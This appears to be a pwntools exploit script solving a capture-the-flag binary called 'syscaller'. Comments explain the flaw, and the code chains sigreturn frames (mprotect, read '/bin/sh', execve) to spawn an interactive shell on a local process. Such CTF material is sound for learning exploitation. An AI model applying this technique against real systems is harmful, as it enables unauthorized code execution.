from pwn import *

'''
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)

Disassembly of section .text:

00000000004000e0 <_start>:
  4000e0:	55                   	push   rbp
  4000e1:	48 89 e5             	mov    rbp,rsp
  4000e4:	48 81 ec 00 02 00 00 	sub    rsp,0x200
  4000eb:	bf 01 00 00 00       	mov    edi,0x1
  4000f0:	48 be 30 01 40 00 00 	movabs rsi,0x400130
  4000f7:	00 00 00 
  4000fa:	ba 3e 00 00 00       	mov    edx,0x3e
  4000ff:	b8 01 00 00 00       	mov    eax,0x1
  ; Write message to stdout
  400104:	0f 05                	syscall 
  400106:	b8 00 00 00 00       	mov    eax,0x0
  40010b:	48 89 e6             	mov    rsi,rsp
  40010e:	bf 00 00 00 00       	mov    edi,0x0
  400113:	ba 00 02 00 00       	mov    edx,0x200
  ; Read 0x200 bytes from stdin onto the stack
  400118:	0f 05                	syscall 
  ; Pop the values we just read from the stack into registers
  40011a:	41 5c                	pop    r12
  40011c:	41 5b                	pop    r11
  40011e:	5f                   	pop    rdi
  40011f:	58                   	pop    rax
  400120:	5b                   	pop    rbx
  400121:	5a                   	pop    rdx
  400122:	5e                   	pop    rsi
  400123:	5f                   	pop    rdi
  400124:	0f 05                	syscall 
  ; Syscall exit(0)
  400126:	b8 3c 00 00 00       	mov    eax,0x3c
  40012b:	48 31 ff             	xor    rdi,rdi
  40012e:	0f 05                	syscall 


    syscall arguments / calling convention for linux x86_64:
    rax: syscall_nr
    arguments: rdi, rsi, rdx, ...

    vuln: 
        I mean, it literally pops our input into registers and uses them to syscall...
        What's not to like?

    Exploit strategy:
        1. Use the first syscall to setup a sigreturn.
        2. use a sigreturn to make an RW. page
        3. read "/bin/sh" into RW with a read call
        4. execve the /bin/sh string.

    Simply writing some shellcode at step 3definitely works as well, and is probably a better idea.
    I'm just using this to get more familiar with sigrop.

'''

context.update(arch='amd64', os='linux')
e = context.binary = ELF("./syscaller")

if args.GDB:
    p = gdb.debug(e.path,
    '''
    ''')
else:
    p = process(e.path)

read_nr      = 0
sigreturn_nr = 15
execve_nr    = 59
mprotect_nr  = 10
# First perform a syscall, then setup another read of 0x200 into stack, ...
syscall_then_read = 0x400104


def pre_sigret():
    # Trigger a sigreturn
    payload  = b""
    payload += b"AAAAAAAA"       # R12
    payload += b"BBBBBBBB"       # R11
    payload += b"CCCCCCCC"       # RDI
    payload += p64(sigreturn_nr) # RAX
    payload += b"DDDDDDDD"       # RBX
    payload += b"EEEEEEEE"       # RDX
    payload += b"FFFFFFFF"       # RSI
    payload += b"GGGGGGGG"       # RDI (again)
    return payload


payload = pre_sigret()
# 1. Make the binary writable
# -> mprotect(bin, 0x1000, 0x7)
frame = SigreturnFrame()
frame.rax = mprotect_nr
frame.rdi = 0x400000
frame.rsi = 0x1000
frame.rdx = 0x7
frame.rip = syscall_then_read
# Migrate the stack to some other known space in the binary that doesn't interfere with
# our other reads
frame.rsp = e.symbols["msg1"] + 0x10
payload += bytes(frame)
assert len(payload) <= 0x200
p.sendlineafter("Make your way or perish.", payload)


payload = pre_sigret()
# 2. Setup a read call into the data section to write /bin/sh\0 to a known location
# -> Read(0, e.symbols.msg1, plenty)
frame = SigreturnFrame()
frame.rax = read_nr
frame.rdi = 0
frame.rsi = e.symbols["msg1"]
frame.rdx = len("/bin/sh\0")
frame.rip = syscall_then_read
# Migrate the stack to some other known space in the binary that doesn't interfere with
# our other reads
frame.rsp = e.symbols["msg1"] + 0x10
payload += bytes(frame)

assert len(payload) <= 0x200
#p.sendlineafter("Make your way or perish.", payload)

p.sendline(payload)

p.send("/bin/sh\0")

# 3. Setup an execve syscall using the /bin/sh string we just wrote
# execve(e.sym.msg1, NULL, NULL)
payload  = b""
payload += b"AAAAAAAA"            # R12
payload += b"BBBBBBBB"            # R11
payload += b"CCCCCCCC"            # RDI
payload += p64(execve_nr)         # RAX
payload += b"DDDDDDDD"            # RBX
payload += p64(0)                 # RDX
payload += p64(0)                 # RSI
payload += p64(e.symbols["msg1"]) # RDI (again)

assert len(payload) <= 0x200
p.sendline(payload)

p.interactive()


